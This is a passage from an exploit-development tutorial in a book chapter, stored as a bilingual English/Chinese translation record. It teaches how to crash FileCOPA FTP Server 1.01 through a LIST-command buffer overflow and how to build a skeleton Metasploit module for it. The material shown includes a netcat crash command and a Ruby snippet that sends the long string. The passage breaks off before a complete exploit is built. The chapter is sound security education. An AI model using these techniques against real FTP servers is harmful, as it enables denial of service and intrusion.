- en: Chapter 10. WRITING A METASPLOIT 3.1 MODULE WITH RUBY
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第10章。使用Ruby编写Metasploit 3.1模块
- en: '![WRITING A METASPLOIT 3.1 MODULE WITH RUBY](../Images/00001.jpg)'
  id: totrans-1
  prefs: []
  type: TYPE_IMG
  zh: '![使用Ruby编写Metasploit 3.1模块](../Images/00001.jpg)'
- en: The previous chapters of this book have been devoted to what I consider mainstream
    Ruby scripting. Ruby is one of my passions, and information security is another,
    so I decided to write a chapter combining them. This chapter is a step-by-step
    guide to exploit development using the Metasploit Framework (MSF).
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本书的前几章已经致力于我所谓的主流Ruby脚本编程。Ruby是我的一大爱好，信息安全也是另一个，所以我决定写一章将它们结合起来。这一章是使用Metasploit框架（MSF）进行漏洞利用开发的逐步指南。
- en: For the following example, I used a vulnerability I found listed on the Open
    Source Vulnerability Database ([http://www.osvdb.org/](http://www.osvdb.org/)).
    We won't be discovering vulnerabilities ourselves, but there are many other books
    and articles written on the subject. If you like what you see here, then you should
    take a look at fuzzing and software reverse engineering because those are two
    of the primary methods used to find exploits.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下示例中，我使用了一个我在开源漏洞数据库([http://www.osvdb.org/](http://www.osvdb.org/))上找到的漏洞。我们不会自己发现漏洞，但关于这个主题有许多其他书籍和文章。如果你喜欢这里看到的内容，那么你应该看看模糊测试和软件逆向工程，因为这些都是发现漏洞的主要方法之一。
- en: By the end of this chapter, you will know how to write a working exploit for
    a closed-source FTP server—all using the wicked cool power of Ruby and MSF.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 到本章结束时，你将知道如何使用Ruby和MSF的强大功能编写一个针对闭源FTP服务器的有效漏洞利用。
- en: I almost couldn't believe it when I read that the Metasploit team decided to
    completely rewrite MSF in Ruby. (MSF 2.0 used Perl as its foundation.) A nice
    feature of both Perl and Ruby is that they are platform independent, so both Windows
    and Unix-like operating systems are capable of using the framework. I'm excited
    about this topic, so let's get started!
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 当我读到Metasploit团队决定完全用Ruby重写MSF时，我几乎不敢相信。（MSF 2.0使用Perl作为其基础。）Perl和Ruby的一个很好的特性是它们都是平台无关的，因此Windows和类Unix操作系统都能够使用这个框架。我对这个话题很兴奋，让我们开始吧！
- en: Introduction to Metasploit
  id: totrans-6
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit简介
- en: 'MSF is a great tool for writing exploits, quickly switching payloads, and managing
    exploited systems. To make sure we are speaking the same language, the *exploit*
    is what allows the attacker to gain control of a system—the code that takes advantage
    of the software''s vulnerability. The *payload* is the code that you''d like to
    execute on the target machine after exploitation: It could be a bind shell, which
    would launch a command prompt every time an attacker connects to a specific port
    on the victim machine, or it could be as simple as adding a user on the victim
    machine. If you browse through an exploit-repository website like [http://www.milw0rm.com/](http://www.milw0rm.com/),
    you''ll find that most exploits have some payload at the top of the code. Those
    exploits only do one thing and are, thus, not terribly flexible. If you wanted
    a different payload, you would have to rewrite the exploit each time to add the
    new payload and make adjustments to the buffer sizes so the exploit continued
    to function properly. The process can be tedious.'
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: MSF是一个编写漏洞利用、快速切换有效载荷和管理被利用系统的优秀工具。为了确保我们使用的是同一种语言，*漏洞利用*是指攻击者获取系统控制权的方法——利用软件漏洞的代码。*有效载荷*是在利用后希望在目标机器上执行的代码：它可能是一个绑定shell，每次攻击者连接到受害机器上的特定端口时，都会启动一个命令提示符，或者它可能只是简单地添加一个用户到受害机器上。如果你浏览一个漏洞库网站，如[http://www.milw0rm.com/](http://www.milw0rm.com/)，你会发现大多数漏洞利用在代码顶部都有一些有效载荷。这些漏洞利用只做一件事，因此并不非常灵活。如果你需要一个不同的有效载荷，你必须每次重写漏洞利用来添加新的有效载荷，并调整缓冲区大小，以确保漏洞利用能够正常工作。这个过程可能很繁琐。
- en: MSF creates the payloads dynamically, based on user input; once you write an
    exploit in MSF, switching payloads is a breeze. Along with the core of MSF, there
    are other tools and auxiliary modules that are useful during exploit development
    and penetration testing, such as reconnaissance, protocol fuzzing, Denial of Service,
    and vulnerability scanning. I encourage you to think beyond the exploits included
    with the framework. Many MSF users know the basics of MSF but don't know how to
    create their own modules. This chapter will expose you to the real strength of
    MSF—customized exploitation.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: MSF 根据用户输入动态创建有效载荷；一旦在 MSF 中编写了攻击代码，切换有效载荷就变得非常简单。除了 MSF 的核心之外，还有其他工具和辅助模块在攻击开发和渗透测试期间非常有用，例如侦察、协议模糊测试、拒绝服务和漏洞扫描。我鼓励您超越框架中包含的攻击。许多
    MSF 用户了解 MSF 的基础知识，但不知道如何创建自己的模块。本章将向您展示 MSF 的真正优势——定制攻击。
- en: Installation
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 安装
- en: I will be using two different systems for the example. One is a Windows XP machine
    (the attacker), and the other is a Windows 2000 machine (the victim). The physical
    network layout doesn't matter too much for this example. I used a virtualized
    network, but you can install the applications on one machine or have two separate
    computers. As far as operating systems, the victim must be a Windows 2000 machine
    due to the libraries used in the exploit. Once you have written the exploit, the
    attacking machine can run any operating system that is supported by Metasploit,
    which is just about everything. The choice is yours; the results will be the same.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 我将使用两个不同的系统作为示例。一个是 Windows XP 机器（攻击者），另一个是 Windows 2000 机器（受害者）。对于这个示例，物理网络布局并不重要。我使用了虚拟化网络，但您也可以在一个机器上安装应用程序，或者使用两台独立的计算机。至于操作系统，由于攻击中使用的库，受害者必须是
    Windows 2000 机器。一旦您编写了攻击代码，攻击机器可以运行 Metasploit 支持的任何操作系统，几乎涵盖了所有操作系统。选择权在您手中；结果将相同。
- en: To follow along with this chapter, you will need a fully functional installation
    of MSF 3.1 on your computer, which you can obtain from [http://www.metasploit.com/framework/](http://www.metasploit.com/framework/).
    Make sure you choose the Metasploit version for your operating system. I will
    be referring to a Windows installation, but the installation process on other
    operating systems will be similar due to the smart design of Metasploit.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章内容，您需要在您的计算机上安装一个完整的 MSF 3.1 版本，您可以从 [http://www.metasploit.com/framework/](http://www.metasploit.com/framework/)
    获取。请确保您选择适合您操作系统的 Metasploit 版本。我将参考 Windows 安装，但其他操作系统的安装过程将与 Metasploit 的智能设计相似。
- en: Once you've installed MSF on the attack machine, start the framework by selecting
    **Start ► Programs ► Metasploit 3 ► Metasploit 3 GUI**. (To follow along, non-Windows
    users should launch the Metasploit 3 GUI.)
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 在攻击机器上安装 MSF 后，通过选择 **开始 ► 程序 ► Metasploit 3 ► Metasploit 3 GUI** 来启动框架。（为了跟随教程，非
    Windows 用户应启动 Metasploit 3 GUI。）
- en: 'MSF has four ways to operate the framework: *Metasploit 3 Web, Graphical User
    Interface (GUI), Command-Line Interface (CLI)*, and *Console*. The console and
    CLI are both text-based. The Metasploit 3 Web interface and GUI are graphical,
    with varying degrees of granularity in the exploit process. The GUI will be the
    interface we use for this chapter.'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: MSF 有四种操作框架的方式：*Metasploit 3 Web、图形用户界面 (GUI)、命令行界面 (CLI)* 和 *控制台*。控制台和 CLI
    都是文本界面。Metasploit 3 Web 界面和 GUI 是图形界面，在攻击过程中具有不同程度的粒度。GUI 将是我们本章使用的界面。
- en: I used the console almost exclusively in MSF 2.0, but I switched to the GUI
    in version 3.1 because the interface is so clean and easy to use, and the functionality
    is comparable to the console. Knowing how to operate the MSF console will provide
    a better understanding of the framework, and then switching between the console
    and GUI will become seamless.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 在 MSF 2.0 中，我几乎完全使用控制台，但在 3.1 版本中我切换到了 GUI，因为界面非常干净且易于使用，功能与控制台相当。了解如何操作 MSF
    控制台将更好地理解框架，然后切换控制台和 GUI 将变得无缝。
- en: At this point, you've installed MSF 3.1 and can start the Metasploit 3 GUI without
    errors. After you have started the framework, you should see an application window
    that pops up and loads MSF (see [Figure 10-1](#filepos783081)). If for some reason
    you don't get the pop-up, check the MSF logs for any errors.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，您已安装 MSF 3.1 并可以无错误地启动 Metasploit 3 GUI。启动框架后，您应该看到一个弹出窗口，加载 MSF（见 [图
    10-1](#filepos783081)）。如果由于某种原因没有弹出窗口，请检查 MSF 日志中是否有任何错误。
- en: '![The Metasploit GUI](../Images/00017.jpg)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit GUI](../Images/00017.jpg)'
- en: Figure 10-1. The Metasploit GUI
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-1. Metasploit GUI
- en: 'When the application has finished loading, you will notice several panes with
    different titles: *Exploits/Auxiliary, Jobs, Module Information/Output*, and *Sessions*.
    You can click around in each pane to see various parts of the framework. If you''ve
    gotten this far, then your MSF install was successful, and we can move on to writing
    the exploit. If this is your first time using MSF, then take a moment to browse
    around and get a feel for the interface before coming back to this section.'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 当应用程序加载完成后，你会注意到几个带有不同标题的窗格：*Exploits/Auxiliary, Jobs, Module Information/Output*和*Sessions*。你可以在每个窗格中点击查看框架的各个部分。如果你已经到了这一步，那么你的MSF安装是成功的，我们可以继续编写漏洞利用。如果你是第一次使用MSF，那么在回到这一节之前，花点时间浏览一下并熟悉一下界面。
- en: Writing a Module
  id: totrans-19
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 编写模块
- en: The last time I checked, the framework came with over 450 exploits and 104 payloads
    to assist its users in security research. The number of payloads and exploits
    vary thanks to regular updates from the security community. The exploits included
    are based on well-known and documented vulnerabilities, so targeting a fully updated
    system would frustrate the user and framework … that is, unless the user knows
    how to write his own modules.^([[2](#filepos787314)])
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 上次我检查时，该框架附带超过450个漏洞利用和104个有效载荷，以帮助用户进行安全研究。由于安全社区的定期更新，有效载荷和漏洞利用的数量会有所变化。包含的漏洞利用基于已知的和有文档记录的漏洞，因此针对完全更新的系统会让用户和框架感到沮丧……也就是说，除非用户知道如何编写自己的模块.^([[2](#filepos787314)])
- en: The 450 exploits that come bundled with MSF 3.1 are located in *msf3.tar\msf3\modules\exploits\*.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: MSF 3.1附带450个漏洞利用，位于*msf3.tar\msf3\modules\exploits\*。
- en: The directory structure of the modules is very well organized; for example,
    to find an FTP exploit on a Windows machine, you'd look in the folder *windows*,
    and then *ftp*.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 模块的目录结构组织得非常好；例如，要在Windows机器上找到一个FTP漏洞利用，你会在*windows*文件夹中查找，然后是*ftp*。
- en: The target program we will be exploiting is FileCOPA FTP Server version 1.01
    from before July 18, 2006\. A Google search will turn up the vulnerable program.
    The FTP software runs on a Windows platform and provides an FTP service. The vulnerability
    we will exploit resides in improper bounds-checking of an argument passed to the
    `LIST` function. The vulnerability is publicly available, and the advisory, "FileCOPA
    FTP Server LIST Command Overflow," can be found on the Open Source Vulnerability
    Database website ([http://osvdb.org/show/osvdb/27389/](http://osvdb.org/show/osvdb/27389/)).
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将要利用的目标程序是2006年7月18日之前发布的FileCOPA FTP Server版本1.01。通过谷歌搜索可以找到有漏洞的程序。该FTP软件在Windows平台上运行，并提供FTP服务。我们将利用的漏洞存在于传递给`LIST`函数的参数的不当边界检查中。该漏洞是公开的，可以在开源漏洞数据库网站上找到关于“FileCOPA
    FTP Server LIST命令溢出”的警告([http://osvdb.org/show/osvdb/27389/](http://osvdb.org/show/osvdb/27389/))。
- en: Several proof-of-concept exploits have been written for this vulnerability,
    so this exploit won't add anything new to the security world. However, by understanding
    how to create your own MSF module, you will be able to develop other undocumented
    exploits. This module was recently added to the MSF 3.1 installation. If you are
    using an older version of MSF (pre-3.1), then you can add the module to your MSF
    library.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 已经为这个漏洞编写了几个概念验证漏洞利用，所以这个漏洞利用不会为安全世界带来任何新内容。然而，通过了解如何创建自己的MSF模块，你将能够开发其他未记录的漏洞利用。此模块最近被添加到MSF
    3.1安装中。如果你使用的是MSF的旧版本（3.1之前），则可以将模块添加到你的MSF库中。
- en: '* * *'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: '* * *'
- en: ^([[2](#filepos785168)]) MSF euphemistically calls exploits *modules*. When
    you see *MSF module*, we're really talking about an exploit in MSF.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: ^([[2](#filepos785168)]) MSF委婉地称漏洞利用为“模块”。当你看到*MSF模块*时，我们实际上在谈论MSF中的漏洞利用。
- en: Building the Exploit
  id: totrans-27
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 构建漏洞利用
- en: As I mentioned previously, FileCOPA FTP Server has a vulnerability in its `LIST`
    function. By targeting a machine running the vulnerable application and sending
    a specially crafted `LIST` command to the server, we can execute arbitrary code
    on the remote machine. This is a good position to be in for a penetration tester
    or security researcher. To test this vulnerability, send the `LIST` command to
    the server followed by the letter A repeated 1,000 times (1,000 is arbitrary;
    the command just needs to be long enough to trigger the overflow). The result
    will be a dead FTP server. The repeated *A*s caused the server to crash because
    the *A*s overwrote important data on the stack.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 如我之前所述，FileCOPA FTP服务器在其`LIST`函数中存在漏洞。通过针对运行有漏洞应用程序的机器并发送一个专门定制的`LIST`命令到服务器，我们可以在远程机器上执行任意代码。这对于渗透测试员或安全研究员来说是一个很好的位置。为了测试这个漏洞，向服务器发送`LIST`命令，后面跟着重复1000次的字母A（1000是任意的；命令只需要足够长以触发溢出）。结果将是一个死掉的FTP服务器。重复的*A*导致服务器崩溃，因为*A*覆盖了堆栈上的重要数据。
- en: To demonstrate the server crashing, we will use a tool bundled with MSF called
    netcat. The tool is located in **Start ► Programs ► Metasploit 3 ► Tools ► Netcat**,
    but it can also be downloaded as a standalone program. The basic description of
    netcat is that it's a networking utility used to read and write data across the
    network—perfect! We'll be reading and writing data to an FTP server across a network.
    To begin the FTP session, run the following commands (you can access the command
    prompt by selecting **Start ► Run**, typing **`cmd`**, and pressing ENTER.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 为了演示服务器崩溃，我们将使用MSF附带的一个工具，名为netcat。该工具位于**开始 ► 程序 ► Metasploit 3 ► 工具 ► Netcat**，但也可以作为独立程序下载。netcat的基本描述是它是一个网络实用程序，用于在网络上读取和写入数据——完美！我们将通过网络向FTP服务器读写数据。要开始FTP会话，请运行以下命令（您可以通过选择**开始
    ► 运行**，输入**`cmd`**并按回车键来访问命令提示符）。
- en: '``**`nc -vv 127.0.0.1 21`** localhost [127.0.0.1] 21 (ftp) open USER anonymous
    220-InterVations FileCOPA FTP Server Version 1.01 220 Trial Version. 30 days remaining
    **`LIST -l ''A''x1000`**``'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: '``**`nc -vv 127.0.0.1 21`** localhost [127.0.0.1] 21 (ftp) open USER anonymous
    220-InterVations FileCOPA FTP Server Version 1.01 220 Trial Version. 30 days remaining
    **`LIST -l ''A''x1000`**``'
- en: The server crashed because it only expects input relating to the listing of
    a file or directory. To verify that the server crashed, try making another connection.
    When we send garbage data (e.g., `'A' x 1000`) to the FTP server, the victim application
    attempts to store all of the input and overwrites itself on the stack. This is
    known as a *stack-based buffer overflow*. The significance of this data overwriting
    is that the program overwrites an address used to point to the next instruction
    for execution. If we overwrite the next address for execution, we can point the
    program to execute our code.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器崩溃是因为它只期望与文件或目录列表相关的输入。为了验证服务器是否崩溃，尝试建立另一个连接。当我们向FTP服务器发送垃圾数据（例如，`'A' x 1000`）时，受害应用程序会尝试存储所有输入并在堆栈上覆盖自身。这被称为基于堆栈的缓冲区溢出。数据覆盖的重要性在于程序覆盖了一个用于指向执行下一个指令的地址。如果我们覆盖执行下一个地址，我们可以让程序执行我们的代码。
- en: 'There are several ways to send the big A string. One way is using netcat, as
    shown above. You can also use Perl, with something like `perl -e "print''A''x1000"`,
    or you can use Ruby. Any way you choose will have the same effect. Using Ruby,
    you can type something like this:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 有几种方法可以发送大的A字符串。一种方法如上所示使用netcat。您也可以使用Perl，例如`perl -e "print'A'x1000"`，或者您可以使用Ruby。无论您选择哪种方式，都会产生相同的效果。使用Ruby，您可以输入类似以下的内容：
- en: '``**`require ''net/ftp''`** **`Net::FTP.open(''127.0.0.1'') do |ftp|`** **`  
     ftp.login`** **`    ftp.list(''A'' + ''A''*1000)`** **`end`**``'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '``**`require ''net/ftp''`** **`Net::FTP.open(''127.0.0.1'') do |ftp|`** **`  
     ftp.login`** **`    ftp.list(''A'' + ''A''*1000)`** **`end`**``'
- en: If you run the code snippet from netcat or Ruby a second time, you will get
    an error message because the client won't be able to connect to the crashed FTP
    server. That is the beginning of our attack. We still need more information to
    build a successful exploit, which leads us to the next step.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您再次运行netcat或Ruby的代码片段，您将收到一个错误消息，因为客户端将无法连接到崩溃的FTP服务器。这就是我们攻击的开始。我们仍然需要更多信息来构建一个成功的利用，这引导我们进入下一步。
- en: Watching in Real Time
  id: totrans-35
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 实时观察
- en: To see the FTP server crash in real time and also track what's happening on
    the stack, you will need a *debugger*. I'm partial to OllyDbg ([http://www.ollydbg.de/](http://www.ollydbg.de/)),
    but Immunity, Inc. recently released Immunity Debugger ([http://www.immunitysec.com/products-immdbg.shtml/](http://www.immunitysec.com/products-immdbg.shtml/)),
    which I'm told is also good. Choose a debugger and install it on the computer
    hosting the FTP server.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 要实时看到FTP服务器崩溃，并跟踪栈上的情况，你需要一个*调试器*。我偏爱OllyDbg ([http://www.ollydbg.de/](http://www.ollydbg.de/))，但Immunity,
    Inc.最近发布了Immunity Debugger ([http://www.immunitysec.com/products-immdbg.shtml/](http://www.immunitysec.com/products-immdbg.shtml/))，据说是很好的。选择一个调试器，并将其安装在托管FTP服务器的计算机上。
- en: Watching the program crash isn't complicated; the first step is to restart the
    FTP Server. Then fire up OllyDbg. When OllyDbg has opened, select **File ► Attach**.
    A list of running processes will pop up in a new window. The list will contain
    all of the processes currently running on the system hosting the FTP server (that
    is, the victim system). Scroll down the list of processes to find the FileCOPA
    FTP Server, named `filecpt`. This is the FTP server process, but it is not what
    we are looking for. If you make a connection to the FTP server, a new *child process*
    will spawn before the FTP server sends any packets. This is the process we want
    to attach. It's called `filecpnt`. Highlight the process and click the **Attach**
    button. Now OllyDbg will be monitoring the FTP connection and will notify you
    if the FileCOPA FTP program crashes or throws an error.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 观察程序崩溃并不复杂；第一步是重启FTP服务器。然后启动OllyDbg。当OllyDbg打开后，选择**文件 ► 附加**。一个运行进程列表将弹出一个新窗口。列表将包含在托管FTP服务器的系统上当前运行的所有进程（即，受害者系统）。滚动进程列表以找到名为`filecpt`的FileCOPA
    FTP服务器。这是FTP服务器进程，但它不是我们要找的。如果你连接到FTP服务器，在FTP服务器发送任何数据包之前，将产生一个新的*子进程*。这是我们想要附加的进程。它被称为`filecpnt`。高亮显示进程并点击**附加**按钮。现在OllyDbg将监控FTP连接，并在FileCOPA
    FTP程序崩溃或出现错误时通知你。
- en: Moving back to your attack machine, you should already have a connection to
    the FTP server. All that's left to do is send the malicious `LIST` command as
    shown above, using netcat or Ruby. As soon as the `LIST` command is sent, OllyDbg
    should pop up on the victim computer with a bright yellow box in the bottom-right
    corner that states `paused`. The bottom-left corner should contain text that says
    `Access violation when executing [41414141]`. The `41` is the hexadecimal representation
    of the letter *A*—the same letter we smashed on the stack! That's exciting news;
    now we are getting somewhere. Take a look at the stack in OllyDbg, located in
    the lower-right pane of the program ([Figure 10-2](#filepos796638)). You'll see
    a whole bunch of `41414141`s repeated. This is the data we sent with the `LIST`
    command.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 返回到你的攻击机器，你应该已经连接到FTP服务器。剩下要做的就是发送上面显示的恶意`LIST`命令，使用netcat或Ruby。一旦发送了`LIST`命令，OllyDbg应该会在受害者计算机上弹出，底部右角有一个明亮的黄色框，上面写着`暂停`。底部左角应该包含显示文本`执行[41414141]时发生访问违规`。`41`是字母*A*的十六进制表示——我们刚刚在栈上破坏的那个字母！这是个令人兴奋的消息；现在我们正在取得进展。看看OllyDbg中的栈，位于程序右下角的面板（[图10-2](#filepos796638)）。你会看到很多重复的`41414141`。这是我们通过`LIST`命令发送的数据。
- en: '![The OllyDbg report on the crashed FTP server](../Images/00018.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![OllyDbg关于崩溃的FTP服务器的报告](../Images/00018.jpg)'
- en: Figure 10-2. The OllyDbg report on the crashed FTP server
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-2. OllyDbg关于崩溃的FTP服务器的报告
- en: 'Now that we can reliably crash the program by hand and we know where we are
    writing our information, let''s give this a try in MSF. To do this, we will need
    to create a shell module and use 1,000 *A*s as the payload. Remember that a module
    is the same thing as an exploit in MSF. The shell we will begin working with looks
    like this:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们能够通过手动可靠地崩溃程序，并且我们知道我们的信息写入位置，那么让我们在MSF中试一试。为此，我们需要创建一个shell模块，并使用1,000个*A*作为负载。记住，在MSF中，模块和漏洞利用是同一回事。我们将开始工作的shell看起来是这样的：
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,           ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.      
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 1000,       
         ''BadChars'' => "\x00",           },           ''Targets''        =>     
           [             [               ''Windows 2000 Professional SP4 English'',
                  {                 ''Platform'' => ''win'',                 ''Ret''
         => 0XDEADBEEF,               },             ],           ]))     end    
     def exploit       connect_login        print_status("Trying target #{target.name}...")    
       print_status("Find the process and attach Ollydbg.")        sleep 30      
     buf  = ''A''*1000       send_cmd( [''LIST'', buf] , false)        handler   
       disconnect     end   end`'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote    include Exploit::Remote::Ftp    def initialize(info
    = {})    super(update_info(info,    ''Name''            => ''FileCOPA 1.01 <=
    列表溢出'',    ''Description''     => %q{此模块利用了FileCOPA多协议文件传输服务中的栈溢出。此漏洞利用需要有效的用户账户（或匿名访问）。    },    ''Author''          =>
    ''Steve <Steve@nostarch.com>'',    ''License''         => MSF_LICENSE,    ''Version''         =>
    ''$Revision: 4498 $'',    ''References''      =>      [      [''OSVDB'', ''27389''],      ],    ''Privileged''      =>
    true,    ''DefaultOptions''  =>      {      ''EXITFUNC''        => ''thread'',      },    ''Payload''         =>      {      ''Space''           =>
    1000,      ''BadChars''        => "\x00",      },    ''Targets''         =>      [      [      ''Windows
    2000 Professional SP4 英文'',      {      ''Platform''        => ''win'',      ''Ret''             =>
    0XDEADBEEF,      },      ],      ],    ]    end    def exploit    connect_login    print_status("尝试目标
    #{target.name}...")    print_status("找到进程并附加Ollydbg.")    sleep 30    buf  = ''A''*1000    send_cmd(
    [''LIST'', buf] , false)    handler    disconnect    end    end`'
- en: Explanation of Metasploit Module Shell
  id: totrans-43
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit模块Shell的说明
- en: This shell has some common sections that are included in most MSF modules. The
    first is `require msf/core`. This `require` statement enables the module to use
    the MSF core library. Next is a class declaration. Since we are attacking an FTP
    server remotely, we need the module to inherit the attributes of `Msf::Exploit::Remote`.
    If you were developing a local privilege escalation or some other type of exploit,
    you would change this line to that specific exploit type. Another line specific
    to our FTP module is `Exploit::Remote::Ftp`, which enables the use of FTP methods.
    This line abstracts some of the commands, such as initializing a connection and
    logging in, so we can focus on writing the exploit rather than establishing the
    FTP session.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 此shell包含大多数MSF模块中常见的部分。首先是`require msf/core`。这个`require`语句使模块能够使用MSF核心库。接下来是类声明。由于我们是在远程攻击FTP服务器，我们需要模块继承`Msf::Exploit::Remote`的属性。如果你正在开发本地提权或其他类型的漏洞利用，你需要将此行更改为特定的漏洞利用类型。我们FTP模块特有的另一行是`Exploit::Remote::Ftp`，它使我们可以使用FTP方法。这一行抽象了一些命令，例如初始化连接和登录，这样我们就可以专注于编写漏洞利用代码，而不是建立FTP会话。
- en: The `initialization` method is where the module begins to take shape. Stepping
    through each line, we begin with the name of the exploit and a description of
    the module. This can be whatever is relevant to the module you are writing. The
    descriptions will be shown whenever a user looks at the exploits from the framework.
    The more accurate the description, the less confusion later.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: '`初始化`方法是从模块开始形成的地方。逐行检查，我们开始于漏洞的名称和模块的描述。这可以是与你所写模块相关的任何内容。描述将在用户查看框架中的漏洞时显示。描述越准确，以后的混淆就越少。'
- en: The next part of the `initialization` method contains information specific to
    the author of the module. Jumping to `payload, platform`, and `targets`—these
    options dictate how the exploit will function, what platforms to target, and other
    constraints. The `EXITFUNC` is set to `thread` so that only a process thread is
    killed when MSF disconnects from the victim. This method will attempt to keep
    from crashing the exploited program on a successful exploit and instead just crash
    a thread.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '`initialization`方法的下一部分包含有关模块作者的特定信息。跳转到`payload`、`platform`和`targets`——这些选项决定了攻击如何运行，要针对哪些平台，以及其他约束。`EXITFUNC`被设置为`thread`，这样当MSF从受害者断开连接时，只有进程线程会被杀死。此方法将尝试避免在成功的攻击中崩溃被利用的程序，而是仅仅崩溃一个线程。'
- en: The payload space size needs to be set to something, and this number is critical
    to our exploit. Right now we will set the value to `1000` characters because we
    slammed A 1,000 times without issue, but we will modify this later. Next are the
    bad characters, or `BadChars`. This list will grow as we find characters that
    frustrate a successful exploit. I've already added `\x00` to the list because
    it signifies the end of a string and is a typical bad character.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 需要设置有效载荷空间的大小，这个数字对我们攻击至关重要。目前我们将值设置为`1000`个字符，因为我们没有问题地连续敲击了1,000次A，但稍后我们将修改这个值。接下来是坏字符，或`BadChars`。随着我们找到阻碍成功攻击的字符，这个列表将会增长。我已经将`\x00`添加到列表中，因为它表示字符串的结尾，并且是一个典型的坏字符。
- en: The next section of the `initialization` method is for the `Targets`. I'm hosting
    the FTP server on a Microsoft Windows 2000 Professional Service Pack 4 machine,
    so the specific target information will be kept here. More platforms can be included
    as the exploit is tested on other operating systems, but for now, we will keep
    the targets limited to our one victim machine. This ends the initialization method
    and provides a solid starting point for the rest of the module.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: '`initialization`方法的下一部分是针对`Targets`的。我在一台Microsoft Windows 2000 Professional
    Service Pack 4机器上托管FTP服务器，所以具体的靶机信息将保存在这里。随着攻击在其他操作系统上进行测试，可以包含更多平台，但到目前为止，我们将靶机限制在我们的一个受害者机器上。这结束了初始化方法，并为模块的其余部分提供了一个稳固的起点。'
- en: The final method of our shell is the called `exploit,` and this is where the
    magic happens. Using `connect_login` (which is part of MSF), we start an FTP session
    with the target. See how much easier that was than using netcat or Ruby by itself?
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 我们shell的最后一个方法是调用的`exploit`，这就是魔法发生的地方。使用`connect_login`（它是MSF的一部分），我们与目标启动一个FTP会话。看看这比使用netcat或Ruby本身要容易多少？
- en: A default status message is displayed after the connection, letting the user
    know that the exploit is in progress and the target information is held in `target.name`.
    Because we are targeting a child process, I added a `sleep` function (lasting
    30 seconds) to allow enough time to attach the debugger to the process before
    smashing the stack.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 连接后显示一个默认的状态消息，让用户知道攻击正在进行中，并且目标信息保存在`target.name`中。因为我们正在针对子进程，我添加了一个`sleep`函数（持续30秒），以便在砸栈之前有足够的时间将调试器附加到进程上。
- en: After the 30 seconds has expired, our payload is created and saved into `buf`.
    In this case, the payload will be 1,000 *A*s. The command `LIST` and the `buf`
    are both sent to the target, and the `handler` method is called to wait for a
    response from the target. If the exploit was successful, then `handler` will catch
    the response and control further actions. When the user is finished with the session,
    `disconnect` is called, which completes the exploit. In this example, the module
